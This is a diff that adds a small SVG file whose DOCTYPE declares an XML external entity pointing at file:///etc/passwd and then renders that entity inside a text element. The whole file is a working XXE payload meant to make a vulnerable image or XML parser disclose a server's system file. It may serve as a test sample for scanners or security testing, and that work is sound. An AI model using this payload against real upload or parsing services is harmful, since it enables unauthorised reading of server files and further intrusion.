@@ -1,0 +1,8 @@
+<!DOCTYPE xsscx [ <!ELEMENT text any > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<svg width="500" height="300" xmlns="http://www.w3.org/2000/svg">
+	<g>
+		<text transfor="translate(0,35)" fill="red" font-size="0.9">
+			&xxe;
+		</text>
+	</g>
+</svg>
